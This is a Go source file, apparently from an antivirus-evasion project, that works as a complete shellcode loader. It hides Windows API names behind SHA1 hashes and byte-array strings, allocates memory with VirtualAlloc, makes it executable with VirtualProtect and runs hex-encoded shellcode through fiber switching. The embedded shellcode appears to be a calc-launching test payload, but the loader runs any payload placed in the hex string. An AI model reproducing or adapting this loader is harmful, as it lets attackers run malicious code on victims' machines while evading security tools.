package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

func main() {

	sc, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	//VirtualProtect-69e06440b787b5b3fac43a60d3f019be95f63896
	pVPt, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "69e06440b787b5b3fac43a60d3f019be95f63896", str2sha1)
	//VirtualAlloc-3567705df8e544d414d315f64ae47e5861b0f68a
	pVAc, _, e := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "3567705df8e544d414d315f64ae47e5861b0f68a", str2sha1)
	if e != nil {
		panic(e)
	}
	//ConvertThreadToFiber-aa85bb3c4e320b27a183d65404ff90cfad8cccb7
	pCTTF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "aa85bb3c4e320b27a183d65404ff90cfad8cccb7", str2sha1)
	//CreateFiber-728bd37ba7ded6f6cda8c9ccaca623f016ccbc46
	pCF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "728bd37ba7ded6f6cda8c9ccaca623f016ccbc46", str2sha1)
	//SwitchToFiber-2e640509ef7b4af90edc332f7da9c8b8021418c9
	pSTF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "2e640509ef7b4af90edc332f7da9c8b8021418c9", str2sha1)
	fiberAddr, _, _ := syscall.Syscall(uintptr(pCTTF), 0, 0, 0, 0)
	addr, _, _ := syscall.Syscall6(uintptr(pVAc), 4, 0, uintptr(len(sc)), uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE), 0, 0)

	if addr == 0 {
		log.Fatal("")
	}
	memcpy(addr, sc)
	oldProtect := PAGE_READWRITE
	syscall.Syscall6(uintptr(pVPt), 4, addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
	fiber, _, _ := syscall.Syscall(uintptr(pCF), 3, 0, addr, 0)
	syscall.Syscall(uintptr(pSTF), 1, fiber, 0, 0)
	syscall.Syscall(uintptr(pSTF), 1, fiberAddr, 0, 0)
}
func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
